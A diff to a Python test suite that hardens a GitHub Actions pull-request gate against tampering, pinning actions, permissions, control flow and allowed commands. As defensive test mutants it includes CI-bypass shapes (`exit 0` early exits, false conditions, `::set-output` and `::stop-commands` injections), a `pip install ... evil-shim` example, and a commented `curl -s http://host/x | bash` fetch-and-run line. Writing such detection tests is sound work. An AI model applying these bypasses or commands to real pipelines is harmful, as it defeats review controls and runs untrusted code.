+    # the claim that `::` is refused workflow-wide — it is not, display-only annotations are admitted,
+    # and the swap deleted the coverage at the new rule's only risk point.
+    HANDLER = 'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::gate failed"; exit 1; }'
     check("it accepts the gate as written, and a re-raising handler after it",
-          invoking_segment('python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }',
-                           "scripts/ai/pr_gate.py") == GATE_CMD)
+          invoking_segment(HANDLER, "scripts/ai/pr_gate.py") == GATE_CMD)
+    NOTICE = 'echo "::notice::selection was --all"'
+    check("a trailing notice annotation is accepted, which is the other edit this repo documents as "
+          "correct and which nothing used to assert",
+          annotation_only(NOTICE) and pure_echo(NOTICE)
+          and not foreign_commands(as_step("set -euo pipefail", NOTICE)), NOTICE)
+    check("while a state-changing workflow command in the same position is not",
+          not annotation_only('echo "::set-output name=ref::HEAD"'))
+    check("the annotation rule admits that handler's payload, so the documented correct edit still "
+          "passes every rule that reads it",
+          all(annotation_only(seg) for seg, _ in parts(HANDLER))
+          and not foreign_commands(as_step("set -euo pipefail", HANDLER)), HANDLER)
     check("and the checker with --no-fetch moved onto the invocation",
           invoking_segment('python scripts/ai/check_branch_scope.py "$@" --no-fetch',
                            "scripts/ai/check_branch_scope.py") == SCOPE_CMD + " --no-fetch")
@@ -1238,7 +1605,7 @@ if os.path.exists(workflow):
                                        "python scripts/ai/pr_gate.py ${SEL}")))
     check("that rule accepts a re-raising handler, whose pieces are `echo` and `exit`",
           not foreign_commands(as_step(
-              'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }')))
+              'python scripts/ai/pr_gate.py ${SEL} || { echo "gate failed"; exit 1; }')))
     check("that rule accepts the retry loop's arithmetic and its `set --` argument building",
           not foreign_commands(as_step("attempt=1", "while :", "do", "set +e",
                                        'python scripts/ai/check_branch_scope.py "$@"',
@@ -1261,6 +1628,41 @@ if os.path.exists(workflow):
                                               " " * 10 + "fi"))}))
     check("that rule accepts a single-line guarded exit, which opens with `if`",
           not escapes_early(as_step('if [ "$c" -ne 2 ]; then exit "$c"; fi')))
+    # The three shapes the line-prefix reading missed. Each was a live false green in the branch-scope
+    # step: every command is in `permitted()`'s vocabulary, the invocation and its `code=$?` are
+    # untouched, and the shell is gone before either runs.
+    for label, snippet in (("an exit after a harmless command on one line", "true; exit 0"),
+                           ("an exit reached through a no-op", ": && exit 0"),
+                           ("an exit guarded by a condition that always holds",
+                            "[ 1 = 1 ] && exit 0"),
+                           # Openers whose condition is a no-op. Exempting on the keyword alone let
+                           # these through: as unconditional as a bare `exit 0`, spelled as a block.
+                           ("an exit under an opener with no real test", "if : ; then exit 0; fi"),
+                           ("an exit under a loop with no real test",
+                            "while :; do exit 0; done")):
+        check(f"that rule rejects {label}", escapes_early(as_step(snippet)), snippet)
+    for label, snippet in (("an always-true test, which conditions nothing",
+                            "if [ 1 = 1 ]; then exit 0; fi"),
+                           ("a word that merely looks like a test",
+                            "if grep -q test x; then exit 0; fi")):
+        check(f"the reachability rule rejects an exit under {label}",
+              escapes_early(as_step(snippet)), snippet)
+    for label, snippet, early in (
+            ("a handler that re-raises the failure it caught",
+             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 1; }', False),
+            ("a handler that re-raises the captured status",
+             'python scripts/ai/pr_gate.py ${SEL} || { echo "x"; exit "$code"; }', False),
+            ("a handler that replaces the failure with success",
+             'python scripts/ai/pr_gate.py ${SEL} || { echo "::error::x"; exit 0; }', True),
+            ("a bare conditional exit 0", "python scripts/ai/pr_gate.py ${SEL} || exit 0", True)):
+        check(f"the reachability rule reads {label} as {'an early exit' if early else 'reachable'}",
+              bool(escapes_early(as_step(snippet))) is early, snippet)
+    check("and still accepts the retry loop's real guarded exit",
+          not escapes_early(as_step('if [ "$code" -ne 2 ]; then exit "$code"; fi')))
+    check("the annotation exception admits the brace-group handler this file calls a correct edit",
+          annotation_only('{ echo "::error::selection was empty"'))
+    check("and still refuses a state-changing workflow command however it is wrapped",
+          not annotation_only('{ echo "::set-output name=ref::HEAD"'))
     check("masking is judged on what follows the command, not the whole line, so a cleanup "
           "before the real call is still accepted",
           executes("          rm -f gate.log || true; python scripts/ai/pr_gate.py ${SEL}",
@@ -1295,10 +1697,36 @@ if os.path.exists(workflow):
     # unpinned `pip install requests`. So the rule inverts: an install line may reference
     # ${reqs} or upgrade pip, and nothing else. It needs no list of packages and so cannot
     # drift from PINS/CO_REQUIRES/deps as those change.
-    restated = [ln for ln in run_contents(wf)
-                if "pip install" in ln
-                and "reqs" not in ln
-                and not re.search(r"pip install\s+--upgrade\s+pip\s*$", ln)]
+    # Third instance of the substring-filter shape in this file (after `ref_lines` and `sel_lines`):
+    # keyed on the text `pip install`, it fired on `echo "::group::pip install"`, which installs
+    # nothing, and told the reader they had restated a pin. Read per segment, and only when the
+    # segment's command *is* pip.
+    def runs_pip(seg):
+        """Is this segment a pip invocation, in any spelling that reaches pip?
+
+        Narrowed to bare `python -m pip` and `pip`, this missed `python3 -m pip`, `pip3`, and either
+        behind a block keyword (`if …; then pip install …`). Those were still refused — but by the
+        vocabulary rule, whose message is about shimming the interpreter, not about a dependency
+        restated in place of `--requirements`. A rule that hands its diagnosis to another rule reads
+        as a bug in that other rule.
+        """
+        words = seg.split()
+        while words and words[0] in KEYWORDS:
+            words = words[1:]
+        return (words[:1] and words[0] in ("pip", "pip3")) or (
+            words[:3] and words[0] in ("python", "python3") and words[1:3] == ["-m", "pip"])
+
+    for spelling in ("pip install requests", "pip3 install requests",
+                     "python -m pip install requests", "python3 -m pip install requests",
+                     "then pip install requests"):
+        check(f"the restated-dependency rule sees {spelling!r} as a pip invocation",
+              runs_pip(spelling), spelling)
+    check("and does not see a log line that merely names it",
+          not runs_pip('echo "::group::pip install"'))
+    restated = [seg.strip() for ln in run_contents(wf) for seg, _ in parts(ln)
+                if runs_pip(seg) and "install" in seg
+                and "reqs" not in seg
+                and not re.search(r"pip install\s+--upgrade\s+pip\s*$", seg)]
     check("every dependency install comes from --requirements rather than being restated",
           not restated, restated)
     check("the gate is asked what to install in the first place",
@@ -1337,8 +1765,16 @@ if os.path.exists(workflow):
     # say. Four of these five shapes survived the round-8 suite.
     JOB_STEPS = ["Checkout repository", "Set up Python", "Resolve the base ref",
                  "Install only what the selection needs", "Run the gate", "Branch scope"]
-    JOB_USES = {"Checkout repository": "actions/checkout@v6",
-                "Set up Python": "actions/setup-python@v6"}
+    JOB_USES = {"Checkout repository": "actions/checkout", "Set up Python": "actions/setup-python"}
+    # Tag or full commit SHA, and the SHA is the one to prefer: pinning to a 40-hex commit is how a
+    # movable tag stops being trusted, and the first version of this rule compared the whole `uses:`
+    # string against `@v6` — refusing the stronger pin while admitting the weaker one, for a rule
+    # whose stated purpose is that neither action can patch the tree.
+    REF = re.compile(r"^(v\d+(?:\.\d+){0,2}|[0-9a-f]{40})$")
+
+    def pinned_use(value):
+        action, _, ref = str(value).partition("@")
+        return action, bool(REF.match(ref))
     # `python -m pip` cannot be left open the way `git fetch` can: `pip install ${reqs} evil-shim`
     # installs whatever it is told, so the two install forms are pinned like everything else.
     PIP_FORMS = ("python -m pip install --upgrade pip", "python -m pip install ${reqs}")
@@ -1347,6 +1783,9 @@ if os.path.exists(workflow):
     # A redirection is how a step writes to the checkout, so its *target* is the rule. The four
     # GitHub-provided files are how steps legitimately pass values on; /dev/null is how `git rev-parse
     # --verify` stays quiet.
+    # Two of these are legitimate *targets* whose contents another rule then refuses: nothing may be
+    # written to `$GITHUB_PATH` at all, and a `$GITHUB_STEP_SUMMARY` write must be display-only. This
+    # list answers "may a step redirect here"; `ALLOWED_WRITES` answers "may it write that".
     REDIR_TARGETS = ('"$GITHUB_OUTPUT"', '"$GITHUB_ENV"', '"$GITHUB_PATH"', '"$GITHUB_STEP_SUMMARY"',
                      "/dev/null")
 
@@ -1379,6 +1818,8 @@ if os.path.exists(workflow):
         if not re.match(r"^[A-Za-z_][A-Za-z_0-9]*=", w0):
             if re.search(r"\$\((?!\()|<\(", seg) or "`" in seg:
                 return False
+        if not annotation_only(seg):
+            return False
         if w0 in HARMLESS or w0 in ("[", "test"):
             return True
         if w0 == "printf":
@@ -1410,9 +1851,18 @@ if os.path.exists(workflow):
     check("the job runs exactly the six steps it is built from, so a seventh cannot arrive without "
           "updating this rule", [s.get("name") for s in job_steps] == JOB_STEPS,
           [s.get("name") for s in job_steps])
-    check("and uses only the two pinned actions, neither of which patches the tree",
-          {s["name"]: s["uses"] for s in job_steps if "uses" in s} == JOB_USES,
-          {s.get("name"): s.get("uses") for s in job_steps if "uses" in s})
+    used = {s["name"]: s["uses"] for s in job_steps if "uses" in s}
+    check("and uses only the two pinned actions, neither of which patches the tree (JOB_USES)",
+          {n: pinned_use(v)[0] for n, v in used.items()} == JOB_USES, used)
+    check("each pinned to a release tag or a commit SHA, so what runs before the gate is not a "
+          "moving target",
+          all(pinned_use(v)[1] for v in used.values()), used)
+    for label, spelling, ok in (("a release tag", "actions/checkout@v6", True),
+                                ("a full commit SHA", "actions/checkout@" + "a" * 40, True),
+                                ("a branch name", "actions/checkout@main", False),
+                                ("no ref at all", "actions/checkout", False)):
+        check(f"that rule {'accepts' if ok else 'rejects'} {label}",
+              pinned_use(spelling)[1] is ok, spelling)
     # Pinning *which* action runs says nothing about what it is pointed at, and checkout's inputs
     # decide what the whole job reads: `ref: ${{ github.base_ref }}` alongside `fetch-depth: 0`
     # checks out the base branch, so the diff is the base against itself, the selection is empty, and
@@ -1421,12 +1871,28 @@ if os.path.exists(workflow):
     # against actually comes from: `BASE: HEAD` leaves both permitted `SEL` lines untouched and makes
     # the selection `HEAD...HEAD`. So the inputs are pinned alongside the identities.
     JOB_WITH = {"Checkout repository": {"fetch-depth": "0", "persist-credentials": "false"},
-                "Set up Python": {"python-version": '"3.13"'}}
+                "Set up Python": {"python-version": None}}
     JOB_ENV = {"Resolve the base ref": {"BASE_REF": "${{ github.base_ref }}"},
                "Install only what the selection needs": {"BASE": "${{ steps.base.outputs.ref }}"}}
-    check("each action's inputs are pinned, so checkout cannot be redirected at another ref",
-          {s["name"]: s["with"] for s in job_steps if "with" in s} == JOB_WITH,
-          {s.get("name"): s.get("with") for s in job_steps if "with" in s})
+    def inputs_of(step):
+        """An action's inputs, dequoted, with values this suite does not pin shown as None.
+
+        `python-version` is `None` because the *floor* rule owns its value: it asserts the runner is
+        at least every suite's floor, which is the property, while this rule is about checkout not
+        being redirected at another ref. Pinned as the literal `'"3.13"'`, it rejected `'3.13'` and
+        `"3.13.1"` — a quoting change and a routine bump — under a message about checkout.
+        """
+        given = {k: _dequote(str(v)) for k, v in (step.get("with") or {}).items()}
+        if step.get("name") in JOB_WITH:
+            for key, pinned in JOB_WITH[step["name"]].items():
+                if pinned is None and key in given:
+                    given[key] = None
+        return given
+
+    check("each action's inputs are pinned, so checkout cannot be redirected at another ref "
+          "(JOB_WITH; a value of None means another rule owns it)",
+          {s["name"]: inputs_of(s) for s in job_steps if "with" in s} == JOB_WITH,
+          {s.get("name"): inputs_of(s) for s in job_steps if "with" in s})
     # Filtered to `in JOB_ENV`, this rule would have been conditional on the thing it guards — a step
     # outside the map could carry any env at all. The set of env-bearing steps is pinned too; the
     # branch-scope step's own mapping is pinned separately as SCOPE_ENV.
@@ -1451,6 +1917,9 @@ if os.path.exists(workflow):
     # branch-scope step keeps working on a public repo with `contents: read` alone, and stops the day
     # this repo is private or mirrored internally — which is the regression this workflow already had
     # to fix once.
+    # Exact, not a superset: a wider scope is the kind of change that should cost a conversation, and
+    # the one a future edit is most likely to want (`checks: write`, to publish a neutral conclusion
+    # for a tool error) is precisely the one worth arguing for rather than acquiring in passing.
     PERMISSIONS = {"contents": "read", "pull-requests": "read"}
     check("the workflow grants exactly the two token scopes the checker needs",
           doc.get("permissions") == PERMISSIONS, doc.get("permissions"))
@@ -1464,18 +1933,36 @@ if os.path.exists(workflow):
     # concurrency group is the weakest of the three and is pinned on principle rather than on a
     # demonstrated bypass: made constant, one PR's run cancels another's, and a cancelled run is not a
     # pass but it is also not a verdict.
-    check("the gate runs on a runner this repository controls",
-          gate_job.get("runs-on") == "ubuntu-latest", gate_job.get("runs-on"))
+    # Any GitHub-hosted Ubuntu runner, not the `-latest` alias alone: pinning `ubuntu-24.04` is
+    # ordinary hardening against alias drift, and rejecting it with "a runner this repository
+    # controls" sent the reader looking for a self-hosted runner they had not added.
+    check("the gate runs on a GitHub-hosted Ubuntu runner, not a self-hosted one",
+          str(gate_job.get("runs-on") or "").startswith("ubuntu-"), gate_job.get("runs-on"))
     check("the job keeps the name a required-check rule would be written against",
           gate_job.get("name") == "Mechanical checks", gate_job.get("name"))
     check("runs are scoped per pull request, so one PR's run cannot cancel another's",
           (doc.get("concurrency") or {}).get("group")
           == "pr-checks-${{ github.event.pull_request.number || github.ref }}",
           (doc.get("concurrency") or {}).get("group"))
+    # The one channel that reaches a later step without writing any file, so no destination-based rule
+    # can see it. Both whitelists refuse `::` outright; these are the forms that would matter.
+    for label, mutant in (("a base ref set through a workflow command rather than a file",
+                           'echo "::set-output name=ref::HEAD"'),
+                          ("the deprecated environment form", 'echo "::set-env name=BASE::HEAD"'),
+                          ("a matcher that rewrites how output is read",
+                           'echo "::add-matcher::/tmp/m.json"'),
+                          ("commands stopped so later lines are not parsed",
+                           'echo "::stop-commands::tok"')):
+        check(f"neither whitelist admits {label}",
+              not permitted(mutant) and not permitted_job(mutant), mutant)
+    check("and an ordinary echo still passes, so that rule is not a ban on echo",
+          permitted('echo "no drift"') and permitted_job('echo "no drift"'))
     stray = [(s.get("name"), seg.strip()) for s in job_steps if "run" in s
              for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)]
     check("every command in every step is one the job exists to run, so no step can rewrite what a "
-          "later one executes", not stray, stray[:4])
+          "later one executes (a segment containing `::` is refused unless it is a display-only "
+          "annotation — a workflow command is parsed off stdout and crosses steps with no "
+          "redirection for a rule to see)", not stray, stray[:4])
     redirs = [(s.get("name"), r) for s in job_steps if "run" in s for r in redirections(s)]
     check("and every redirection writes to a GitHub-provided file or /dev/null, never into the "
           "checkout", not redirs, redirs[:4])
@@ -1511,6 +1998,57 @@ if os.path.exists(workflow):
                for ln in shell_of(s) for seg, _ in parts(ln) if not permitted_job(seg)])
     check("a seventh step is visible to the step-list rule",
           [s.get("name") for s in job_steps] + ["Prepare"] != JOB_STEPS)
+    # Every rule so far reads a line, or a segment of one, in isolation — and a line's *enclosing
+    # control flow* decides whether bash ever reaches it. `while :; do` → `while [ 1 = 2 ]; do` leaves
+    # the invocation, the `code=$?` that follows it, the exit propagation and both command whitelists
+    # exactly as written and never runs any of them; wrapping the gate step in `if [ 1 = 2 ]; then`
+    # does the same to the gate. So the control flow of every step is pinned as an ordered sequence,
+    # which also refuses a *reordering* or an inserted branch, not just a falsified condition. The
+    # gate step's sequence is empty on purpose: it is three lines and needs no branching.
+    # Only the two steps where falsifying a condition could produce a *pass*. It covered all four at
+    # first, which cost a red run on four correct edits — a respelled `[ -z … ]` as `[ … = "" ]`, a
+    # retry budget raised from 3 to 5, an explicit merge_group branch, a fetch guard rewritten as
+    # `rev-parse || fetch` — and bought nothing in the other two: every command in the resolver and
+    # the installer is argv-pinned below, so a skipped branch there ends as `--all` (more checks run)
+    # or MISSING-DEP (a red gate), never a quiet green. A rule that fires on correct code is a rule
+    # someone deletes, and this one had seven such lines to one load-bearing one.
+    JOB_CONTROL = {
+        "Run the gate": [],
+        "Branch scope": ['if [ "${CROSS}" = "true" ]; then', "else", "fi", "while :; do",
+                         'if [ "$code" -ne N ]; then exit "$code"; fi',
+                         'if [ "$attempt" -ge N ]; then', "fi", "done"],
+    }
+
+    def control_flow(step):
+        openers = ("if", "elif", "else", "fi", "while", "until", "for", "do", "done", "case", "esac",
+                   "{", "}")
+        # Integer literals are normalised to `N`: the retry budget is a tunable that lives inside a
+        # condition, and pinning it by text rejected `-ge 5` — an edit the comment above this rule
+        # already listed as a false rejection it had removed, in the one step where the loop lives.
+        # The property is which branches exist and what they test, not how many attempts are allowed.
+        # This also normalises the `-ne 2` that names the tool-error code, which is safe because that
+        # branch exits with `$code` whatever it compares against: a digit cannot turn a verdict into a
+        # pass, while the operator and the variable stay pinned.
+        return [re.sub(r"\b\d+\b", "N", ln.strip()) for ln in shell_of(step)
+                if (ln.split() or [""])[0] in openers or re.search(r";\s*(then|do)\s*$", ln)]
+
+    for step in (s for s in job_steps if "run" in s and s.get("name") in JOB_CONTROL):
+        name = step.get("name")
+        check(f"the control flow of {name!r} is the sequence it was reviewed with, so no condition "
+              "can be falsified and no branch inserted",
+              control_flow(step) == JOB_CONTROL[name], control_flow(step))
+    # Through the real predicate on a mutated step. The controls here compared one list literal
+    # against another built partly *from* it, so they could not fail: replacing `control_flow`'s body
+    # with `return []` left all three passing — and left the gate step's pin passing too, since its
+    # reviewed sequence is empty. The rule worked; nothing demonstrated that it did.
+    for label, lines, pinned in (
+            ("a retry loop that never iterates", ("while [ 1 = 2 ]; do", "done"), "Branch scope"),
+            ("a gate wrapped in a false condition",
+             ("if [ 1 = 2 ]; then", "python scripts/ai/pr_gate.py ${SEL}", "fi"), "Run the gate"),
+            ("a branch inserted around the invocation",
+             tuple(JOB_CONTROL["Branch scope"]) + ("if [ 1 = 2 ]; then", "fi"), "Branch scope")):
+        found = control_flow(as_step(*lines))
+        check(f"that rule rejects {label}", found != JOB_CONTROL[pinned], found)
     # An argv pin that rejects a correct respelling is how a rule gets deleted rather than fixed, so
     # the four spellings of the same permitted redirection are asserted to pass.
     for spelling in ('git rev-parse --verify --quiet "origin/${BASE_REF}" >/dev/null',
@@ -1525,9 +2063,13 @@ if os.path.exists(workflow):
     # The selection's *input*, not just its spelling. SEL is pinned to `--base ${BASE}` below, and
     # BASE is whatever this step wrote: `echo "ref=HEAD"` left both permitted SEL lines untouched
     # and made the diff `HEAD...HEAD`, so the gate selected nothing and passed.
+    # Same subject set as the cross-step rule above — every write to a GitHub file, selected by
+    # destination — rather than the lines whose text contains `ref=`, which a second write could avoid
+    # while still being the value the gate diffs against.
     ALLOWED_REF = ('echo "ref=" >> "$GITHUB_OUTPUT"',
                    'echo "ref=origin/${BASE_REF}" >> "$GITHUB_OUTPUT"')
-    ref_lines = [ln.strip() for ln in run_contents(wf) if "ref=" in ln and "GITHUB_OUTPUT" in ln]
+    ref_lines = [ln.strip() for ln in run_contents(wf)
+                 if re.search(r'>>?\s*"?\$GITHUB_OUTPUT', ln)]
     check("the base the selection diffs against is the real base ref, or empty for a dispatch",
           ref_lines and all(ln in ALLOWED_REF for ln in ref_lines), ref_lines)
     for mutant in ('echo "ref=HEAD" >> "$GITHUB_OUTPUT"',
@@ -1540,7 +2082,18 @@ if os.path.exists(workflow):
     # asserted 3.10 (what sys.stdlib_module_names needs) while harness_suites declares 3.11, so
     # a runner satisfying the test would have failed the job it was meant to protect.
     floor = max(c.get("min_python") or (3, 0) for c in pr_gate.CHECKS)
-    minor = re.search(r'python-version:\s*"(\d+)\.(\d+)"', body)
+    # Read from the parsed document rather than off the raw text, which made an unquoted
+    # `python-version: 3.13` — what a YAML formatter produces — parse as version 0.0 and blame the
+    # matrix. Defaulted at every level: `gate_job` is `{}` when no single job runs the gate, and the
+    # first spelling of this subscripted it, so a mutation that hid the gate job crashed the suite
+    # here and skipped every check below instead of reporting the one that mattered.
+    setup_with = next(((st.get("with") or {}) for st in (gate_job.get("steps") or [])
+                       if st.get("name") == "Set up Python"), {})
+    pinned = _dequote(str(setup_with.get("python-version", "")).strip())
+    minor = re.match(r"^(\d+)\.(\d+)(?:\.\d+)?$", pinned)
+    check("the runner's Python version is a literal this suite can compare against the floors — an "
+          "expression (a matrix, a variable) is not one, and would be read as version 0.0",
+          bool(minor), pinned)
     runner = (int(minor.group(1)), int(minor.group(2))) if minor else (0, 0)
     check(f"the runner meets the matrix's highest floor, {floor[0]}.{floor[1]}",
           runner >= floor, f"runner={runner}, floor={floor}")
@@ -1571,11 +2124,31 @@ print("\nSelection reads the merge base, so commits landed on the base after div
 # repo happens to look like. A two-dot diff here would pick up base_only.txt and select
 # checks for a file the pull request never touched.
 def git(repo, *args):
-    return subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True)
+    """Every call here mutates the fixture, so a failure must stop the run.
+
+    The comment above promised hermeticity and nothing enforced it: each call site discarded the exit
+    code, so a failed `init` — or a `TMPDIR` that itself sits inside a git repository — left `cwd`
+    inside no repo of its own, and every following `add -A`, `commit` and `checkout -b` walked *up*
+    into the enclosing one and rewrote the developer's history. Two reviewers ran into exactly that
+    within one session, on this repository, and one of them also had a `git checkout` swap the
+    workflow file underneath a running suite, which produced a measurement that had to be retracted.
+    A promise of hermeticity has to be an assertion, so failures raise and the ceiling refuses any
+    walk above the throwaway directory.
+    """
+    env = {**os.environ, "GIT_CEILING_DIRECTORIES": os.path.dirname(os.path.realpath(repo))}
+    done = subprocess.run(["git", *args], cwd=repo, capture_output=True, text=True, env=env)
+    if done.returncode:
+        print("TOOL ERROR: fixture git %s failed in %s: %s"
+              % (" ".join(args), repo, (done.stderr or done.stdout).strip()))
+        raise SystemExit(2)
+    return done
 
 
 with tempfile.TemporaryDirectory() as repo:
     git(repo, "init", "-q", "-b", "base")
+    top = git(repo, "rev-parse", "--show-toplevel").stdout.strip()
+    check("the fixture repo is its own repository, not an enclosing one",
+          os.path.realpath(top) == os.path.realpath(repo), (top, repo))
     git(repo, "config", "user.email", "t@example.com")
     git(repo, "config", "user.name", "t")
     open(os.path.join(repo, "seed.txt"), "w").write("seed\n")
@@ -1648,6 +2221,21 @@ with tempfile.TemporaryDirectory() as repo:
         check("the new directory's markdown selects the build-step check",
               "doc_build_steps" in selected_names(pr_gate.changed_files("base")),
               selected_names(pr_gate.changed_files("base")))
+
+        # A staged rename whose *source* path contains a space. With -z the source is its own
+        # entry, carrying no `XY ` prefix, and the parser used to sniff for a space in the third
+        # column: `ab cd/page.md` lost three characters and selected `cd/page.md` — a path that
+        # does not exist — while the real one went unselected. Both halves of a rename are wanted,
+        # because a check keyed on the old path (a doc citing it, a README listing it) has to run.
+        os.makedirs(os.path.join(repo, "ab cd"), exist_ok=True)
+        open(os.path.join(repo, "ab cd", "page.md"), "w").write("# spaced\n")
+        git(repo, "add", "-A")
+        git(repo, "commit", "-qm", "spaced path")
+        git(repo, "mv", "ab cd/page.md", "renamed.md")
+        files = pr_gate.changed_files("base")
+        check("a renamed file's new path reaches selection", "renamed.md" in files, files)
+        check("...and its old path arrives whole, not truncated at a space",
+              "ab cd/page.md" in files and "cd/page.md" not in files, files)
     finally:
         pr_gate.REPO_ROOT = saved_root
 
@@ -1960,9 +2548,18 @@ check("--requirements emits nothing unpinned for cumulusci",
 req_lines = [ln for ln in out.splitlines() if ln.strip()]
 check("--requirements pairs the CumulusCI pin with setuptools",
       any(ln.startswith("setuptools") for ln in req_lines), req_lines)
+def first_line(prefix):
+    """Index of the first requirement with this prefix, or None.
+
+    Spelled as a bare `next()`, this raised StopIteration on exactly the input the check above had
+    just reported as missing — the suite aborted instead of reporting the finding it had made.
+    """
+    return next((i for i, ln in enumerate(req_lines) if ln.startswith(prefix)), None)
+
+
+setuptools_at, cumulusci_at = first_line("setuptools"), first_line("cumulusci")
 check("...and emits setuptools before CumulusCI, the order pip installs in",
-      next(i for i, ln in enumerate(req_lines) if ln.startswith("setuptools"))
-      < next(i for i, ln in enumerate(req_lines) if ln.startswith("cumulusci")),
+      setuptools_at is not None and cumulusci_at is not None and setuptools_at < cumulusci_at,
       req_lines)
 code, out_nocci = run_gate("--requirements", "--changed-files-from", os.devnull)
 check("a selection without CumulusCI does not drag setuptools in",
@@ -2131,7 +2728,8 @@ try:
     pr_gate.REPO_ROOT = no_repo
     pr_gate.run = lambda cmd: (0, "", 0.0)
     try:
-        pr_gate.run_cci_reference_drift()
+        with outside_any_repo(no_repo):
+            pr_gate.run_cci_reference_drift()
         drift_code = 0
     except SystemExit as exc:
         drift_code = exc.code
@@ -2161,7 +2759,8 @@ try:
     prior_root = pr_gate.REPO_ROOT
     pr_gate.REPO_ROOT = broken_git
     try:
-        code, out = main_with(["--base", "origin/264"])
+        with outside_any_repo(broken_git):
+            code, out = main_with(["--base", "origin/264"])
         check("an unusable repo is a tool error, not a clean selection",
               code == 2, f"exit {code}: {out[-200:]}")
     finally:
@@ -2179,9 +2778,21 @@ if FAILED:
     print(f"{len(FAILED)} FAILED: {', '.join(FAILED)}")
     sys.exit(1)
 # Pinned so a check that stops running is a failure rather than a smaller number nobody reads.
-EXPECTED = 317
-if PASSED != EXPECTED:
-    print(f"{PASSED} checks passed but {EXPECTED} were expected — update EXPECTED "
-          "deliberately when adding or removing a check")
+#
+# The two directions are not the same event and used to print the same sentence — "update EXPECTED
+# deliberately" — which is an instruction to make the failure go away. That is the wrong advice in
+# one direction and, worse, it was the *only* output for a step added to the workflow: a step
+# spelled `run: curl -s http://host/x | bash` produced no [FAIL] at all, just a request to bump an
+# integer. (It now fails a whitelist too, since `raw_shell_of` reads inline scalars — but the
+# message had to stop inviting that response either way.)
+EXPECTED = 394
+if PASSED < EXPECTED:
+    print(f"only {PASSED} of {EXPECTED} checks ran — a rule stopped running, which is the failure "
+          "this count exists to catch. Diff the [PASS] labels against a known-good run to find "
+          "which; lowering this number is how a silenced rule ships.")
+    sys.exit(1)
+if PASSED > EXPECTED:
+    print(f"{PASSED} checks ran and {EXPECTED} were expected — if you added checks, raise EXPECTED "
+          "at the bottom of this file.")
     sys.exit(1)
 print(f"{PASSED}/{EXPECTED} checks passed")
